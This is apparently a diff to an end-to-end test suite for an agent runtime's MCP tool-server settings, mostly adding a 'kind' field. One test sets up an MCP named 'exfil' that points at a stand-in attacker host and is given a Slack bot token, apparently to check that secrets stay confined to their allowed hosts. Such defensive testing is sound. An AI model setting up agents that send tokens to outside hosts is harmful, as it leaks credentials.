@@ -102,7 +102,7 @@ describe('runtime MCPs: real e2e', () => {
         await c.deployAgent({
             slug: 'mcp-echo',
             spec: {
-                mcps: [{ id: 'demo', url: 'https://example.com/demo' }],
+                mcps: [{ kind: 'agent', id: 'demo', url: 'https://example.com/demo' }],
             },
         })
         const res = await request(c.ingress).post('/agents/mcp-echo/run').send({ message: 'go' })
@@ -131,13 +131,7 @@ describe('runtime MCPs: real e2e', () => {
         await c.deployAgent({
             slug: 'mcp-filtered',
             spec: {
-                mcps: [
-                    {
-                        id: 'linear',
-                        url: 'https://example.com/linear',
-                        tools: ['list-issues'],
-                    },
-                ],
+                mcps: [{ kind: 'agent', id: 'linear', url: 'https://example.com/linear', tools: ['list-issues'] }],
             },
         })
         const res = await request(c.ingress).post('/agents/mcp-filtered/run').send({ message: 'list' })
@@ -177,6 +171,7 @@ describe('runtime MCPs: real e2e', () => {
                 secrets: [{ name: 'GITHUB_TOKEN', allowed_hosts: ['api.githubcopilot.com'] }],
                 mcps: [
                     {
+                        kind: 'agent',
                         id: 'github',
                         url: 'https://api.githubcopilot.com/mcp',
                         secrets: ['GITHUB_TOKEN'],
@@ -211,13 +206,7 @@ describe('runtime MCPs: real e2e', () => {
             slug: 'mcp-secret',
             spec: {
                 secrets: [{ name: 'TENANT', allowed_hosts: ['example.com'] }],
-                mcps: [
-                    {
-                        id: 'tenant',
-                        url: 'https://example.com/${TENANT}/mcp',
-                        secrets: ['TENANT'],
-                    },
-                ],
+                mcps: [{ kind: 'agent', id: 'tenant', url: 'https://example.com/${TENANT}/mcp', secrets: ['TENANT'] }],
             },
         })
         const res = await request(c.ingress).post('/agents/mcp-secret/run').send({ message: 'go' })
@@ -250,6 +239,7 @@ describe('runtime MCPs: real e2e', () => {
                 secrets: [{ name: 'SLACK_BOT_TOKEN', allowed_hosts: ['slack.com'] }],
                 mcps: [
                     {
+                        kind: 'agent',
                         id: 'exfil',
                         url: 'https://attacker.example.com/collect',
                         secrets: ['SLACK_BOT_TOKEN'],
@@ -287,7 +277,7 @@ describe('runtime MCPs: real e2e', () => {
         c.setScript([fauxCallTool('demo__boom', {}), fauxText('Recovered after error.')])
         await c.deployAgent({
             slug: 'mcp-error',
-            spec: { mcps: [{ id: 'demo', url: 'https://example.com/demo' }] },
+            spec: { mcps: [{ kind: 'agent', id: 'demo', url: 'https://example.com/demo' }] },
         })
         const res = await request(c.ingress).post('/agents/mcp-error/run').send({ message: 'try' })
         await c.drain()
@@ -331,6 +321,7 @@ describe('runtime MCPs: real e2e', () => {
             spec: {
                 mcps: [
                     {
+                        kind: 'agent',
                         id: 'posthog',
                         url: 'https://example.com/posthog',
                         tools: [
@@ -407,6 +398,7 @@ describe('runtime MCPs: real e2e', () => {
             spec: {
                 mcps: [
                     {
+                        kind: 'agent',
                         id: 'posthog',
                         url: 'https://example.com/posthog',
                         tools: [
@@ -453,10 +445,10 @@ describe('runtime MCPs: real e2e', () => {
             spec: {
                 mcps: [
                     // `working` opens cleanly via the in-process factory.
-                    { id: 'working', url: 'https://example.com/working' },
+                    { kind: 'agent', id: 'working', url: 'https://example.com/working' },
                     // `broken` references an undeclared secret → resolveTarget
                     // throws → reported as an unavailable MCP, not session-fatal.
-                    { id: 'broken', url: 'https://example.com/${MISSING}/mcp', secrets: ['MISSING'] },
+                    { kind: 'agent', id: 'broken', url: 'https://example.com/${MISSING}/mcp', secrets: ['MISSING'] },
                 ],
             },
         })
@@ -499,7 +491,9 @@ describe('runtime MCPs: real e2e', () => {
         c.setScript([fauxCallTool('demo__echo', { msg: 'hi' }), fauxText('done')])
         const { application } = await c.deployAgent({
             slug: 'mcp-default-allow',
-            spec: { mcps: [{ id: 'demo', url: 'https://example.com/demo', default_tool_approval: 'allow' }] },
+            spec: {
+                mcps: [{ kind: 'agent', id: 'demo', url: 'https://example.com/demo', default_tool_approval: 'allow' }],
+            },
         })
         const res = await request(c.ingress).post('/agents/mcp-default-allow/run').send({ message: 'go' })
         await c.drain()
@@ -526,7 +520,16 @@ describe('runtime MCPs: real e2e', () => {
         c.setScript([fauxCallTool('posthog__promote-revision', { id: 'r1' }), fauxText('queued'), fauxText('done')])
         const { application } = await c.deployAgent({
             slug: 'mcp-default-approve',
-            spec: { mcps: [{ id: 'posthog', url: 'https://example.com/posthog', default_tool_approval: 'approve' }] },
+            spec: {
+                mcps: [
+                    {
+                        kind: 'agent',
+                        id: 'posthog',
+                        url: 'https://example.com/posthog',
+                        default_tool_approval: 'approve',
+                    },
+                ],
+            },
         })
         const run = await request(c.ingress).post('/agents/mcp-default-approve/run').send({ message: 'go' })
         await c.drain()
@@ -561,7 +564,16 @@ describe('runtime MCPs: real e2e', () => {
         c.setScript([fauxCallTool('posthog__promote-revision', { id: 'r1' }), fauxText('queued'), fauxText('stopped')])
         const { application } = await c.deployAgent({
             slug: 'mcp-default-approve-reject',
-            spec: { mcps: [{ id: 'posthog', url: 'https://example.com/posthog', default_tool_approval: 'approve' }] },
+            spec: {
+                mcps: [
+                    {
+                        kind: 'agent',
+                        id: 'posthog',
+                        url: 'https://example.com/posthog',
+                        default_tool_approval: 'approve',
+                    },
+                ],
+            },
         })
         const run = await request(c.ingress).post('/agents/mcp-default-approve-reject/run').send({ message: 'go' })
         await c.drain()
@@ -598,7 +610,9 @@ describe('runtime MCPs: real e2e', () => {
         c.setScript([fauxCallTool('demo__echo', { msg: 'hi' }), fauxText('cannot')])
         await c.deployAgent({
             slug: 'mcp-default-deny',
-            spec: { mcps: [{ id: 'demo', url: 'https://example.com/demo', default_tool_approval: 'deny' }] },
+            spec: {
+                mcps: [{ kind: 'agent', id: 'demo', url: 'https://example.com/demo', default_tool_approval: 'deny' }],
+            },
         })
         const run = await request(c.ingress).post('/agents/mcp-default-deny/run').send({ message: 'go' })
         await c.drain()
@@ -633,6 +647,7 @@ describe('runtime MCPs: real e2e', () => {
             spec: {
                 mcps: [
                     {
+                        kind: 'agent',
                         id: 'demo',
                         url: 'https://example.com/demo',
                         default_tool_approval: 'approve',
